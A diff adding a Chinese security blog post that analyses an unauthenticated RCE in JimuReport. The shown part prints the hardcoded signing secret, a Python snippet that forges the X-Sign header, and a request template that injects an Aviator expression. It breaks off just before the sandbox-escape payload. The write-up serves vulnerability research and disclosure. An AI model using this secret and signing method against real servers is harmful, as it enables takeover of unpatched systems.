@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="硬编码的 MD5 密钥，加上没有覆盖 getter 路径的语言级沙箱，组合出默认配置下的未授权 RCE。   IntroJimuReport 这条Pre-Auth RCE 链路由两个缺陷叠加而成：  自动导出接口 &#x2F;jmreport&#x2F;auto&#x2F;export&#x2F;python&#x2F;plugin 的签名密钥硬编码在 jar 里，X-Sign 可伪造。 Jim">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸">
+<meta property="og:url" content="https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+<meta property="og:site_name" content="Z3r4y｜Take it easy">
+<meta property="og:description" content="硬编码的 MD5 密钥，加上没有覆盖 getter 路径的语言级沙箱，组合出默认配置下的未授权 RCE。   IntroJimuReport 这条Pre-Auth RCE 链路由两个缺陷叠加而成：  自动导出接口 &#x2F;jmreport&#x2F;auto&#x2F;export&#x2F;python&#x2F;plugin 的签名密钥硬编码在 jar 里，X-Sign 可伪造。 Jim">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z3r4y.github.io/images/29/0-workbench.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/29/2-step1-repeater.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/29/3-step2-repeater.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/29/1-marker.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/29/4-fix-diff.png">
+<meta property="article:published_time" content="2026-09-10T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-10T18:00:41.337Z">
+<meta property="article:author" content="Z3r4y">
+<meta property="article:tag" content="JimuReport">
+<meta property="article:tag" content="Aviator">
+<meta property="article:tag" content="沙箱逃逸">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z3r4y.github.io/images/29/0-workbench.png">
+    
+    
+      <meta name="google-site-verification" content="5XKznQqqg14CSMKePYUh0Fo_1E543E2Uxt6L5AqvL-Q">
+    
+    
+      <link rel="canonical" href="https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸 | Z3r4y</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Z3r4y｜Take it easy" type="application/atom+xml">
+<link rel="alternate" href="/rss.xml" title="Z3r4y｜Take it easy" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2026/09/08/RangeFactory%EF%BC%9A%E5%A4%9A%E8%B7%B3%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%A7%84%E6%A8%A1%E5%8C%96%E6%9E%84%E5%BB%BA%E4%B8%8E%E6%89%A7%E8%A1%8C%E9%AA%8C%E8%AF%81/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&text=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&is_video=false&description=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸&body=Check out this article: https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&title=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&name=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://z3r4y.github.io/2026/09/10/JimuReport-%E6%9C%AA%E6%8E%88%E6%9D%83RCE-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AD%BE%E5%90%8D%E4%B8%8EAviator%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/&t=JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BC%AA%E9%80%A0-X-Sign-%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">第一步：伪造 X-Sign 绕过认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AAviator-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%B0-RCE"><span class="toc-number">3.</span> <span class="toc-text">第二步：Aviator 沙箱逃逸到 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Break-Fix"><span class="toc-number">4.</span> <span class="toc-text">Break &amp; Fix</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JimuReport 未授权 RCE：硬编码签名与 Aviator 沙箱逃逸
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Z3r4y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-09-10T04:00:00.000Z" class="dt-published" itemprop="datePublished">2026-09-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Cyber-Security/">Cyber Security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Aviator/" rel="tag">Aviator</a>, <a class="p-category" href="/tags/JimuReport/" rel="tag">JimuReport</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>, <a class="p-category" href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="tag">沙箱逃逸</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>硬编码的 MD5 密钥，加上没有覆盖 getter 路径的语言级沙箱，组合出默认配置下的未授权 RCE。</p>
+</blockquote>
+<p><img src="/images/29/0-workbench.png" alt="workbench"></p>
+<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>JimuReport 这条Pre-Auth RCE 链路由两个缺陷叠加而成：</p>
+<ol>
+<li>自动导出接口 &#x2F;jmreport&#x2F;auto&#x2F;export&#x2F;python&#x2F;plugin 的签名密钥硬编码在 jar 里，X-Sign 可伪造。</li>
+<li>JimuReport 给 Aviator 做了沙箱，但 5.2.6 的 getter 路径没有类白名单校验：可以先拿到 Feature.StaticMethods 加回白名单，再把 functionMissing 改成反射兜底，最终用 Runtime.exec 执行命令。</li>
+</ol>
+<style>
+/* 概览表：首列不折行 */
+.e-content table th:first-child,
+.e-content table td:first-child {
+  min-width: 110px;
+}
+</style>
+
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>编号</td>
+<td>QVD-2026-61751</td>
+</tr>
+<tr>
+<td>类型</td>
+<td>未授权 RCE（签名伪造 + 表达式沙箱逃逸）</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>JimuReport 2.5.1；2.5.2 的关键类字节码与 2.5.1 完全一致，starter POM 仍锁 aviator.version&#x3D;5.2.6</td>
+</tr>
+<tr>
+<td>依赖版本</td>
+<td>Aviator &lt; 5.4.0（JimuReport 打包的是 5.2.6）；5.4.0 起才在 getter 路径上校验类白名单，且默认配置下 5.4.4 仍可利用</td>
+</tr>
+<tr>
+<td>所需权限</td>
+<td>无需认证，默认配置</td>
+</tr>
+<tr>
+<td>入口</td>
+<td>POST &#x2F;jmreport&#x2F;auto&#x2F;export&#x2F;python&#x2F;plugin</td>
+</tr>
+<tr>
+<td>注入点</td>
+<td>报表参数值以 &#x3D; 开头，被当作 Aviator 表达式求值</td>
+</tr>
+<tr>
+<td>影响</td>
+<td>以应用进程权限执行任意命令，完全控制服务器</td>
+</tr>
+</tbody></table>
+<h2 id="第一步：伪造-X-Sign-绕过认证"><a href="#第一步：伪造-X-Sign-绕过认证" class="headerlink" title="第一步：伪造 X-Sign 绕过认证"></a>第一步：伪造 X-Sign 绕过认证</h2><p>接口 &#x2F;jmreport&#x2F;auto&#x2F;export&#x2F;python&#x2F;plugin 上打了 @JimuSignature，由 JimuReportSignatureInterceptor 做校验（该类在未开源的 starter jar 里）。核心逻辑如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JimuReportSignatureInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">X_SIGN</span> <span class="operator">=</span> <span class="string">&quot;X-Sign&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">X_TIMESTAMP</span> <span class="operator">=</span> <span class="string">&quot;X-TIMESTAMP&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PRINT_PLUGIN_SIGN_SECRET</span> <span class="operator">=</span></span><br><span class="line">            <span class="string">&quot;6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">MAX_EXPIRE</span> <span class="operator">=</span> <span class="number">300L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">clientTimestamp</span> <span class="operator">=</span> Long.parseLong(xTimeStamp);</span><br><span class="line">        <span class="keyword">if</span> (System.currentTimeMillis() - clientTimestamp &gt; <span class="number">300000L</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.error(response, <span class="string">&quot;签名验证失败:X-TIMESTAMP已过期&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (requestUri.endsWith(<span class="string">&quot;/auto/export/python/plugin&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> requestWrapper.getBody();</span><br><span class="line">            <span class="type">String</span> <span class="variable">signValue</span> <span class="operator">=</span> DigestUtils.md5DigestAsHex(</span><br><span class="line">                    (body + PRINT_PLUGIN_SIGN_SECRET).getBytes(<span class="string">&quot;UTF-8&quot;</span>)).toUpperCase();</span><br><span class="line">            <span class="keyword">if</span> (!signValue.equals(headerSign)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.error(response, <span class="string">&quot;签名校验失败，参数有误！&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个致命点：</p>
+<ul>
+<li>密钥硬编码在 jar 里。6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121 是编译进产物的常量，攻击者从安装包里就能提取，从零构造合法签名。</li>
+<li>签名只覆盖 body。X-Sign &#x3D; MD5(body + secret).toUpperCase()，X-TIMESTAMP 不参与计算。</li>
+<li>时间戳只防过期、不防未来。判断是 now - ts &gt; 300000，只拒绝超过 5 分钟的请求；把时间戳设成未来反而能拿到更长的重放窗口。</li>
+</ul>
+<p>伪造过程非常直接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">body: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5((body + SECRET).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest().upper()</span><br><span class="line"></span><br><span class="line">ts = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))   <span class="comment"># 当前毫秒时间戳</span></span><br></pre></td></tr></table></figure>
+
+<p>重放时只需要把 X-TIMESTAMP 换成当前时间，X-Sign 保持不变（因为 body 没变）。</p>
+<p>进入导出流程后，报表参数如果以 &#x3D; 开头，就会被当作 Aviator 表达式求值。请求体形如：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;reportParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;891612623430320128&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;=&lt;aviator expression&gt;&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;exportType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PDF&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exportType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PDF&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>sex 是官方示例数据预置的参数，默认部署就有。它是这条 demo 报表数据集 s1 声明的参数（底层查 rep_demo_dxtj 表，SQL 里按 sex 过滤），exportType: PDF 触发导出流程，从而走到表达式求值。</p>
+<h2 id="第二步：Aviator-沙箱逃逸到-RCE"><a href="#第二步：Aviator-沙箱逃逸到-RCE" class="headerlink" title="第二步：Aviator 沙箱逃逸到 RCE"></a>第二步：Aviator 沙箱逃逸到 RCE</h2><p>JimuReport 并不是裸用 Aviator，它在 ExpressUtil 里做了裁剪：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(AviatorEvaluatorInstance engine)</span> &#123;</span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">features</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(Feature.getFullFeatures());</span><br><span class="line">    features.remove(Feature.NewInstance);</span><br><span class="line">    features.remove(Feature.Use);</span><br><span class="line">    features.remove(Feature.Module);</span><br><span class="line">    features.remove(Feature.StaticMethods);</span><br><span class="line">    features.remove(Feature.StaticFields);</span><br><span class="line">    engine.setOption(Options.FEATURE_SET, features);</span><br><span class="line">    engine.setOption(Options.ALLOWED_CLASS_SET, Collections.emptySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>预期的沙箱边界是：不允许 new 任意对象（NewInstance）、不允许 use(…) 导入类（Use）、不允许 load &#x2F; require 模块（Module）、不允许调用静态方法或访问静态字段（StaticMethods &#x2F; StaticFields）、类名解析白名单为空（ALLOWED_CLASS_SET &#x3D; emptySet）。注意 Aviator 里 null 表示允许所有类、空集表示禁止所有类，所以这里是取最严的一档，目标是让表达式彻底碰不到 Java 类。</p>
+<p>看起来挺严，但 Aviator 的 Feature 并不是 JVM 级的安全机制，而是在特定语法节点上手工插入的检查。Feature 是 Aviator 定义的语言能力枚举：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Feature</span> &#123;</span><br><span class="line">    Assignment, Return, If, ForLoop, WhileLoop, Let, LexicalScope,</span><br><span class="line">    Lambda, Fn, InternalVars, Module, ExceptionHandle,</span><br><span class="line">    NewInstance, StringInterpolation, Use, StaticFields, StaticMethods;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它默认是全开的（Feature.getFullFeatures()），执行时靠两处显式检查：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parser：针对特定语法节点</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureFeatureEnabled</span><span class="params">(Feature feature)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.featureSet.contains(feature)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedFeatureException</span>(feature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newStatement</span><span class="params">()</span> &#123; <span class="built_in">this</span>.ensureFeatureEnabled(Feature.NewInstance); ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reflector.fastGetProperty：StaticMethods / StaticFields 的唯一检查点</span></span><br><span class="line"><span class="comment">// 所有「类名.成员」的解析都从这里过，payload 里的 CC.forName、AY.set 也是</span></span><br><span class="line">val = tryResolveStaticMethod</span><br><span class="line">    &amp;&amp; instance.isFeatureEnabled(Feature.StaticMethods)</span><br><span class="line">    &amp;&amp; names.length == <span class="number">2</span></span><br><span class="line">    ? Reflector.fastGetProperty(target.innerClazz, rName, PropertyType.StaticMethod)</span><br><span class="line">    : ...</span><br></pre></td></tr></table></figure>
+
+<p>问题就在于：普通对象的属性访问走的是 getter 路径，这条路径上没有 Feature 检查，也没有类白名单检查。而 Aviator 又把引擎自身的内部变量暴露了出来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Env.get()</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;__instance__&quot;</span> == key) &#123;</span><br><span class="line">    <span class="built_in">this</span>.instance.ensureFeatureEnabled(Feature.InternalVars);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.instance;        <span class="comment">// AviatorEvaluatorInstance</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;__env__&quot;</span> == key) &#123;</span><br><span class="line">    <span class="built_in">this</span>.instance.ensureFeatureEnabled(Feature.InternalVars);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;                 <span class="comment">// Env 自身</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>InternalVars 默认在 features 里，所以表达式可以匿名读取 __instance__ 与 __env__，沙箱的入口就开了。step1 的完整 payload：</p>
